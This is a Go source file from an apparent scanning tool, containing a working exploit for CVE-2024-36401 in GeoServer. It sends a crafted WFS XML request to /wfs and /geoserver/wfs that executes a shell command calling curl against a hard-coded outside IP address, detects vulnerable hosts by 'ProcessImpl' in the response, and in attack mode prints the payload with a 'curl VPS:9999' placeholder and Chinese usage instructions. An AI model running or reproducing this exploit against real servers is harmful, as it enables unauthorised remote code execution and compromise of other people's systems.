package CVEs

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"time"
)

func CVE_2024_36401(url string, Attack bool) error {
	payload := `
<wfs:GetPropertyValue service='WFS' version='2.0.0'
 xmlns:topp='http://www.openplans.org/topp'
 xmlns:fes='http://www.opengis.net/fes/2.0'
 xmlns:wfs='http://www.opengis.net/wfs/2.0'>
  <wfs:Query typeNames='sf:archsites'/>
  <wfs:valueReference>
    exec(java.lang.Runtime.getRuntime(),'curl 140.143.171.190:9999')
  </wfs:valueReference>
</wfs:GetPropertyValue>
`
	// 创建自定义的 Transport(禁用SSL)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	client := &http.Client{
		Transport: tr,
		Timeout:   10 * time.Second, // 设置超时时间为 10 秒
	}

	url2 := fmt.Sprintf("%s/wfs", url)
	url3 := fmt.Sprintf("%s/geoserver/wfs", url)
	//fmt.Println(url2)
	request, err := http.NewRequest("POST", url2, strings.NewReader(payload))
	if err != nil {
		return err
	}
	request.Header.Add("Content-Type", "application/xml")
	request.Header.Add("Content-Length", fmt.Sprint(strings.NewReader(payload).Len()))

	response, err := client.Do(request)
	if err != nil {
		return err
	}
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		return err
	}
	//fmt.Println(string(body2))

	request3, err := http.NewRequest("POST", url3, strings.NewReader(payload))
	if err != nil {
		return err
	}
	request3.Header.Add("Content-Type", "application/xml")
	request3.Header.Add("Content-Length", fmt.Sprint(strings.NewReader(payload).Len()))

	response3, err := client.Do(request3)
	if err != nil {
		return err
	}
	body3, err := ioutil.ReadAll(response3.Body)
	if err != nil {
		return err
	}

	if strings.Contains(string(body), "ProcessImpl") || strings.Contains(string(body3), "ProcessImpl") {
		fmt.Println("[*]CVE-2024-36401 : " + url)
		if Attack {
			fmt.Println("Attack-Result : " + "请使用POST方法请求/wfs，并传入请求体`\n<wfs:GetPropertyValue service='WFS' version='2.0.0'\n xmlns:topp='http://www.openplans.org/topp'\n xmlns:fes='http://www.opengis.net/fes/2.0'\n xmlns:wfs='http://www.opengis.net/wfs/2.0'>\n  <wfs:Query typeNames='sf:archsites'/>\n  <wfs:valueReference>\n    exec(java.lang.Runtime.getRuntime(),'curl VPS:9999')\n  </wfs:valueReference>\n</wfs:GetPropertyValue>\n`\n")
		}
	}

	defer response.Body.Close()

	return nil
}
